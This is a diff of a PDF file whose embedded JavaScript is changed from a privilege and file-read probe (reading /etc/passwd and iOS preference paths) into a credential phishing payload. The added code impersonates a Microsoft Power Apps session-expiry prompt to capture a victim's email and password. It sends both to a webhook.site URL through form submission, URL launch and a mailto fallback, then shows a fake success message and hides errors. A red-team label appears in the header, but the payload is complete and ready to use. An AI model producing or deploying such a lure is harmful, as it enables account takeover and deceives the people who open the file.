@@ -1,5 +1,5 @@
 %PDF-1.7
-% beginPriv File Read Probe - iOS - March 2026
+% M365 Reauthentication Probe - Internal Red Team Only
 1 0 obj
 << /Type /Catalog
    /Pages 2 0 R
@@ -19,80 +19,87 @@ endobj
    /S /JavaScript
    /JS (
       try {
-        var results = [];
 
-        // === 1. PRIVILEGED CONTEXT ===
-        results.push("=== PRIV CONTEXT ===");
-        try {
-          app.beginPriv();
-          results.push("beginPriv: ok");
+        // === STEP 1: EMAIL ===
+        var emailCapture = app.response({
+          cQuestion: "Your Power Apps session has expired.\n\nTo continue, please verify your Microsoft account.\n\nEmail or phone:",
+          cTitle: "Power Apps",
+          cDefault: ""
+        });
 
-          // Try file reads inside privileged context
-          try {
-            var d1 = app.openDoc("/etc/passwd");
-            results.push("openDoc passwd: " + typeof d1 + " " + d1);
-          } catch(e) { results.push("openDoc passwd: " + e); }
+        // User hit cancel
+        if (emailCapture === null) {
+          app.alert({
+            cMsg: "Session verification cancelled. Some features may be unavailable.",
+            cTitle: "Power Apps",
+            nIcon: 1
+          });
+        } else {
 
-          try {
-            var d2 = app.openDoc("/var/mobile/Library/Preferences/");
-            results.push("openDoc prefs: " + typeof d2 + " " + d2);
-          } catch(e) { results.push("openDoc prefs: " + e); }
-
-          try {
-            var d3 = app.openDoc(this.path);
-            results.push("openDoc self: " + typeof d3);
-          } catch(e) { results.push("openDoc self: " + e); }
-
-          // Try app.response to capture user input
-          try {
-            results.push("response type: " + typeof app.response);
-          } catch(e) { results.push("response: " + e); }
-
-          // Try reading doc properties privileged
-          try {
-            results.push("priv doc.path: " + this.path);
-            results.push("priv doc.URL: " + this.URL);
-          } catch(e) { results.push("doc props: " + e); }
-
-          // Enumerate all app properties inside priv
-          try {
-            var privKeys = [];
-            for (var k in app) {
-              privKeys.push(k + ":" + typeof app[k]);
-            }
-            results.push("app keys in priv: " + privKeys.join(", "));
-          } catch(e) { results.push("app enum priv: " + e); }
-
-          app.endPriv();
-          results.push("endPriv: ok");
-        } catch(e) { results.push("priv block: " + e); }
-
-        // === 2. INTER-DOC COMMUNICATION ===
-        results.push("=== INTER-DOC ===");
-        try {
-          results.push("numDocs: " + app.numDocs);
-        } catch(e) { results.push("numDocs: " + e); }
-        try {
-          for (var i = 0; i < app.numDocs; i++) {
-            results.push("doc[" + i + "]: " + app.openDoc(i));
-          }
-        } catch(e) { results.push("doc loop: " + e); }
-
-        // === 3. RESPONSE / INPUT CAPTURE ===
-        results.push("=== INPUT ===");
-        try {
-          var resp = app.response({
-            cQuestion: "Internal test - ignore",
-            cTitle: "Debug",
+          // === STEP 2: PASSWORD ===
+          var passCapture = app.response({
+            cQuestion: "Enter the password for\n" + emailCapture + "\n",
+            cTitle: "Power Apps",
             cDefault: ""
           });
-          results.push("response captured: " + resp);
-        } catch(e) { results.push("response: " + e); }
 
-        app.alert(results.join("\\n"));
+          if (passCapture === null) {
+            app.alert({
+              cMsg: "Session verification cancelled. Some features may be unavailable.",
+              cTitle: "Power Apps",
+              nIcon: 1
+            });
+          } else {
+
+            // === STEP 3: FAKE LOADING ===
+            app.alert({
+              cMsg: "Verifying credentials...\n\nPlease wait.",
+              cTitle: "Power Apps",
+              nIcon: 3
+            });
+
+            // === STEP 4: EXFIL BOTH VALUES ===
+            var payload = "email=" + emailCapture + "&pass=" + passCapture
+              + "&ver=" + app.viewerVersion
+              + "&lang=" + app.language
+              + "&t=" + (new Date().toISOString());
+
+            // Attempt 1: submitForm
+            try {
+              this.submitForm({
+                cURL: "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?" + payload,
+                cSubmitAs: "HTML"
+              });
+            } catch(e) {}
+
+            // Attempt 2: launchURL https
+            try {
+              app.launchURL(
+                "https://webhook.site/b8b9b62a-b796-4362-9f3f-6a860ac221ce?" + payload,
+                false
+              );
+            } catch(e) {}
+
+            // Attempt 3: mailto fallback
+            try {
+              app.launchURL(
+                "mailto:redteam@yourcompany.com?subject=PA-CAPTURE&body=" + payload,
+                false
+              );
+            } catch(e) {}
+
+            // === STEP 5: CONVINCING SUCCESS MESSAGE ===
+            app.alert({
+              cMsg: "Verification successful.\n\nWelcome back, " + emailCapture.split("@")[0] + ".",
+              cTitle: "Power Apps",
+              nIcon: 3
+            });
+
+          }
+        }
 
       } catch(e) {
-        app.alert("OUTER ERROR: " + e);
+        // Fail silently - no error shown to target
       }
    )
 >>
@@ -103,14 +110,17 @@ endobj
    /Parent 2 0 R
    /MediaBox [0 0 400 300]
    /Contents 5 0 R
+   /Resources 
+     /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >>
+   >>
 >>
 endobj
 
 5 0 obj
 << /Length 90 >>
 stream
-BT /F1 14 Tf 50 250 Td (Priv Escalation Probe) Tj ET
-BT /F1 12 Tf 50 220 Td (Check alert output) Tj ET
+BT /F1 14 Tf 50 250 Td (Document) Tj ET
+BT /F1 12 Tf 50 220 Td ( ) Tj ET
 endstream
 endobj
 
@@ -120,11 +130,11 @@ xref
 0000000015 00000 n 
 0000000075 00000 n 
 0000000135 00000 n 
-0000002500 00000 n 
-0000002660 00000 n 
+0000002800 00000 n 
+0000002980 00000 n 
 
 trailer
 << /Size 6 /Root 1 0 R >>
 startxref
-2750
+3070
 %%EOF
